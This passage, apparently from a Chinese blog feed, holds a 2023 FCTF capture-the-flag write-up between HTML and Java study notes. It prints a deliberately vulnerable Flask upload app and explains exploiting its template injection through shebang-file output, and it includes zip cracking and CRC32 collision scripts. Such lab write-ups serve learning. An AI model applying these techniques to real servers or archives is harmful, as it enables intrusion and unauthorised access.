align=&#39;left|right|center&#39;&gt;居左，右，中，默认居左&lt;/h1&gt;&gt;</code></p><p>段落通过<code>&lt;p&gt;</code>标签定义<code>&lt;p&gt;这是一个段落&lt;/p&gt;</code></p><p><code>&lt;p&gt;这是一个可以换&lt;br&gt;行的标签&lt;/p&gt;</code></p><p><code>&lt;hr/&gt;</code>标签在html页面中创建水平线，<code>&lt;hr color=&quot;&quot; width=&quot;&quot; size=&quot;&quot; aligh=&quot;&quot; /&gt;</code></p><ul><li>color：颜色</li><li>width：长度</li><li>size：水平线高度</li><li>align：对齐方式，默认居中</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023FCTF</title>
    <link href="/2023/04/27/FCTF/"/>
    <url>/2023/04/27/FCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023FCTF"><a href="#2023FCTF" class="headerlink" title="2023FCTF"></a>2023FCTF</h1><h2 id="热身赛"><a href="#热身赛" class="headerlink" title="热身赛"></a>热身赛</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ViewSource"><a href="#ViewSource" class="headerlink" title="ViewSource"></a>ViewSource</h4><p>一道简单的前端题，根据提示ViewSource，<code>ctrl+u</code>查看源代码，这里网页代码被加密过了，直接往下看发现可疑段落</p><p><img src="/2023/04/27/FCTF/image-20230427005335078.png"></p><p>分析逻辑，用户输入<code>your_flag</code>，如果<code>your_flag</code>与<code>my_flag</code>相同，则弹窗<code>my_flag</code></p><p>提供两种做法</p><p>既然<code>my_flag</code>变量在js代码中定义，那么我们就能用控制台把它输出</p><p><img src="/2023/04/27/FCTF/image-20230427010136529.png"></p><p><code>ctrl+s</code>保存网页源代码用编辑器打开</p><p><img src="/2023/04/27/FCTF/image-20230427010344248.png"></p><p>修改代码逻辑，如果用户输入的<code>your_flag</code>与实际flag不相等则弹窗<code>my_flag</code>，保存，打开html文件往输入框里随便输个什么提交</p><p><img src="/2023/04/27/FCTF/image-20230427010548568.png"></p><hr><h4 id="javaDeserialize-1"><a href="#javaDeserialize-1" class="headerlink" title="javaDeserialize-1"></a>javaDeserialize-1</h4><p><img src="/2023/04/27/FCTF/image-20230429201037517.png"></p><p>点开题目，</p><hr><h4 id="javaDeserialize-2"><a href="#javaDeserialize-2" class="headerlink" title="javaDeserialize-2"></a>javaDeserialize-2</h4><hr><h4 id="filechecker-mini"><a href="#filechecker-mini" class="headerlink" title="filechecker_mini"></a>filechecker_mini</h4><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/04/27/FCTF/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/04/27/FCTF/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/04/27/FCTF/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/04/27/FCTF/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/04/27/FCTF/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/04/27/FCTF/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/04/27/FCTF/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/04/27/FCTF/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/04/27/FCTF/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/04/27/FCTF/image-20230429194117415.png"></p><p><img src="/2023/04/27/FCTF/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/04/27/FCTF/image-20230429195640928.png"></p><p><img src="/2023/04/27/FCTF/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/04/27/FCTF/image-20230429195958840.png"></p><p>上传文件，获取flag。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="png"><a href="#png" class="headerlink" title="png"></a>png</h4><p>附件下载下来是一张png图片，</p><p><img src="/2023/04/27/FCTF/image-20230430041531911.png"></p><p>010打开划拉到最底部发现冗余数据，部分flag<code>FCTF&#123;To</code>，</p><p><img src="/2023/04/27/FCTF/image-20230430043203297.png"></p><p>010跑PNGTemplate.bt脚本报错，左下提示CRC不匹配，说明修改了高宽却没有修改CRC导致读取报错，图片宽高很可能被修改过。(或者放入kali中无法打开)</p><p><img src="/2023/04/27/FCTF/image-20230430043711587.png"></p><p>进行一个高度的改，将高度640改为700</p><p><img src="/2023/04/27/FCTF/image-20230430044130507.png"></p><p>文件头数据块IHDR包含的第一部分数据就是图片宽高，分别对应第二行中的第一组四个字节和第二组四个字节，掏出计算器算算高度拉长点。</p><p><img src="/2023/04/27/FCTF/image-20230430044803732.png"></p><p>得到另一部分flag：<code>_the_flawless_</code></p><p><img src="/2023/04/27/FCTF/image-20230430045240866.png"></p><p>然后就是做这道题时比较懵逼的一个地方了，招最后一部分flag。先开起zsteg看看能拿到什么吧。查到了之前找到的<code>FCTF&#123;To</code>，但是愣是没发现最后一部分flag，如果有LSB隐写那zsteg也应该能淦出来才对呀？</p><p><img src="/2023/04/27/FCTF/image-20230430045440795.png"></p><p>由于过于依赖工具，死磕这条路坚信不存在lsb隐写。愣是没用Stegsolve手搓，到处找，查IDAT块、翻EXIF信息…最后还得感谢ixout手搓LSB出来。</p><p><img src="/2023/04/27/FCTF/image-20230430050104649.png"> </p><p>呜呜呜呜呜呜呜呜呜呜。</p><p>最后三段flag拼接起来得到flag。</p><p>呜呜呜呜呜呜呜呜呜呜。</p><h4 id="cet6"><a href="#cet6" class="headerlink" title="cet6"></a>cet6</h4><p>一道基础的USB取证题，但是不太常规。。。</p><h4 id="zip套娃"><a href="#zip套娃" class="headerlink" title="zip套娃"></a>zip套娃</h4><p>第一层：</p><p>binwalk无法分离，不是伪加密。没给其他条件明文攻击也不太行，那就爆破试试吧（。</p><p><img src="/2023/04/27/FCTF/image-20230430051023113.png"></p><p>ARCHPR开起来，攻击方式字典，选的是kali字典。跑了一段时间后成功拿到第一层密码。</p><p><img src="/2023/04/27/FCTF/image-20230430130335839.png"></p><p>第二层：</p><p>依然先丢到kali里binwalk试下，分离成功，伪加密</p><p><img src="/2023/04/27/FCTF/image-20230430142037485.png"></p><p>分离出来的东西多了个0.zip打开其实就是第二层的包不过问题不大，直接看第三层的压缩包</p><p><img src="/2023/04/27/FCTF/image-20230430142135922.png"></p><p>第三层：</p><p>打开压缩包看到了一个支点.txt文件，同时第二层解压出来后也有一个支点.txt，支点.txt文件大小大于12字节，大胆猜测是明文攻击。</p><p><img src="/2023/04/27/FCTF/image-20230430144529014.png"></p><p>WinRAR将泄密出来的文件压缩为zip，开始明文攻击，然后就。。。</p><p><img src="/2023/04/27/FCTF/image-20230430144651066.png"></p><p>相信不止我一个人遇到这种情况。。。这里我们忽略了一些细节，加密文件是通过什么方式压缩的呢？不同压缩软件采用的压缩算法也会不同，自然会出现不匹配的情况，这里多尝试几次，鼠标右键发送到压缩文件可行，开始明文攻击</p><p><img src="/2023/04/27/FCTF/image-20230430145433930.png"></p><p><img src="/2023/04/27/FCTF/image-20230430145615362.png"></p><p>等待了一段时间之后拿到秘钥(btw这一坨是啥。。。)</p><p><img src="/2023/04/27/FCTF/image-20230430150510674.png"></p><p>第四层：</p><p>字典、明文、伪加密，各种姿势都试过了，打开压缩包看一眼，分散成这么多小文件，大胆猜测CRC碰撞</p><p><img src="/2023/04/27/FCTF/image-20230430152951249.png"></p><p>EXIF查看一下压缩文件数据，CRC32、字节数等等</p><p><img src="/2023/04/27/FCTF/image-20230430153333151.png"></p><p>大致整理下6个文本文件的CRC32、字节数：</p><table><thead><tr><th align="center">文件名</th><th align="center">CRC32</th><th align="center">字节数</th></tr></thead><tbody><tr><td align="center">1.txt</td><td align="center">0x92716b7c</td><td align="center">5</td></tr><tr><td align="center">2.txt</td><td align="center">0x1ab6bb72</td><td align="center">4</td></tr><tr><td align="center">3.txt</td><td align="center">0xfcf21afd</td><td align="center">3</td></tr><tr><td align="center">4.txt</td><td align="center">0x89a155cb</td><td align="center">5</td></tr><tr><td align="center">5.txt</td><td align="center">0x2d09a3d6</td><td align="center">6</td></tr><tr><td align="center">6.txt</td><td align="center">0xe3f20a9d</td><td align="center">2</td></tr></tbody></table><p>1-3字节的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1byte</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0xda6fd2a0</span>, <span class="hljs-number">0xf6a70</span>, <span class="hljs-number">0x70659eff</span>, <span class="hljs-number">0x862575d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            char_crc = binascii.crc32(char1.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>            calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将获取到的字符的CRC32值与0xffffffff进行与运算</span><br>            <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将每个字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),char1))<br>                comment += char1<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">2bytes</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0xe3f20a9d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            <span class="hljs-keyword">for</span> char2 <span class="hljs-keyword">in</span> chars:<br>                res_char = char1 + char2<span class="hljs-comment">#获取遍历的任意2Byte字符</span><br>                char_crc = binascii.crc32(res_char.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>                calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将获取到的字符的CRC32值与0xffffffff进行与运算</span><br>                <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),res_char))<br>                    comment += res_char<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430160710583.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">3bytes</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0x92716b7c</span>, <span class="hljs-number">0x1ab6bb72</span>, <span class="hljs-number">0xfcf21afd</span>, <span class="hljs-number">0x89a155cb</span>, <span class="hljs-number">0x2d09a3d6</span>, <span class="hljs-number">0xe3f20a9d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            <span class="hljs-keyword">for</span> char2 <span class="hljs-keyword">in</span> chars:<br>                <span class="hljs-keyword">for</span> char3 <span class="hljs-keyword">in</span> chars:<br>                    res_char = char1 + char2 + char3<span class="hljs-comment">#获取遍历的任意3Byte字符</span><br>                    char_crc = binascii.crc32(res_char.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>                    calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将遍历的字符的CRC32值与0xffffffff进行与运算</span><br>                    <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),res_char))<br>                        comment += res_char<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430160744568.png"></p><p>4-6字节的使用<a href="https://github.com/theonlypwner/crc32">theonlypwner</a>工具，修改供选字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">permitted_characters = <span class="hljs-built_in">set</span>(<br>    <span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>, <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;!&#x27;</span>))  <span class="hljs-comment"># \w</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430161138948.png"></p><p><code>FTCF&#123;</code></p><p><img src="/2023/04/27/FCTF/image-20230430161219428.png"></p><p><code>Y0u_</code></p><p><img src="/2023/04/27/FCTF/image-20230430161254433.png"></p><p><code>_z1p_</code></p><p><img src="/2023/04/27/FCTF/image-20230430161318849.png"></p><p><code>master</code></p><p>拼接起来就是<code>FTCF&#123;Y0u_4re_z1p_master!&#125;</code></p><p>使用theonlypwner时出了点问题，最开始忘记了flag中必含的”{“”}”字符，导致怎么都跑不出来，还是看了眼hint想起来应该修改脚本中的供选字符。如果感叹号是在4-6字节的那些文件的话肯定也跑不出来了，考虑问题还是不够周到。</p><p>（大佬的博客：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</a>）</p><p>（CTFwiki：<a href="https://ctf-wiki.org/misc/archive/zip/#_7%EF%BC%89">https://ctf-wiki.org/misc/archive/zip/#_7）</a></p><hr><h2 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h4><p>附件如图所示：</p><p><img src="/2023/04/27/FCTF/image-20230519013136127.png"></p><p>一整张图构成极其简单，想要藏什么数据的话大概率只能是IDAT块隐写了，pngcheck查看下</p><p><img src="/2023/04/27/FCTF/image-20230519013017814.png"></p><p>9个IDAT块，块长度没有隐藏什么特殊信息，一张正常的png图片的IDAT块的前面的块应该都是填充满且相同大小的，这个check结果显然就不正常，感觉每一个块都单独成图。试着删除块。</p><p>tweakpng：</p><p><img src="/2023/04/27/FCTF/image-20230519013824840.png"></p><p>准备删IDAT块，九个块就拷贝九份先。删块的时候不要把IEND块删了，这是png格式的结尾标识。</p><p>每个IDAT块单独成一张图片，已经很明显了，是一张二维码。</p><p><img src="/2023/04/27/FCTF/image-20230519014312145.png"></p><p>自己对于二维码结构的认知只有三个定位块（悲），所以瞎拼，然后都没法扫（，根据学长放的<a href="https://www.cnblogs.com/mq0036/p/14445719.html">hint</a>：</p><p><img src="/2023/04/27/FCTF/image-20230519021831370.png"></p><p><img src="/2023/04/27/FCTF/image-20230519021849222.png"></p><p>归纳就是三个定位块的周围一个像素块的一圈必须是空白的，且相互之间有黑白像素块交叉分布的定时标志，根据特征拿到ps里拼了下</p><p><img src="/2023/04/27/FCTF/image-20230519022132076.png"></p><p>扫一下，拿到flag：</p><p><code>FCTF&#123;n1ce_puzzl3&#125;</code></p><h4 id="自信音游人"><a href="#自信音游人" class="headerlink" title="自信音游人"></a>自信音游人</h4><p>附件是给的曲目选自阿卡伊的だいあるのーと。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
      <tag>ssrf</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_note</title>
    <link href="/2023/04/24/java-note/"/>
    <url>/2023/04/24/java-note/</url>
    
    <content type="html"><![CDATA[<h1 id="浅记Java学习记录"><a href="#浅记Java学习记录" class="headerlink" title="浅记Java学习记录"></a>浅记Java学习记录</h1><p>JRE：运行Java字节码的虚拟机</p><p>JDK：如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ascii"> ┌─    ┌──────────────────────────────────┐<br> │     │     Compiler, debugger, etc.     │<br> │     └──────────────────────────────────┘<br>JDK ┌─ ┌──────────────────────────────────┐<br> │  │  │                                  │<br> │ JRE │      JVM + Runtime Library       │<br> │  │  │                                  │<br> └─ └─ └──────────────────────────────────┘<br>       ┌───────┐┌───────┐┌───────┐┌───────┐<br>       │Windows││ Linux ││ macOS ││others │<br>       └───────┘└───────┘└───────┘└───────┘<br></code></pre></td></tr></table></figure><h3 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>public：访问修饰符</li><li>static：关键字</li><li>void：返回类型</li><li>main：方法名</li></ul><p><code>String[] args</code>也可写为<code>String args[]</code>，为避免歧义尽量用前者</p><p>注意：</p><ul><li>java<strong>大小写敏感</strong></li><li>类名首字母应大写，如果由多个单词组成，每个单词首字母大写</li><li>方法名应该以驼峰式写法</li><li>源文件名必须与类名相同</li><li>主方法入口：所有的java程序由<code>public static void main(String[] args)</code>方法开始执行</li></ul><p><img src="/2023/04/24/java-note/image-20230822192334835.png"></p><p>构造方法：</p><figure class="highlight java"><table><tr><td 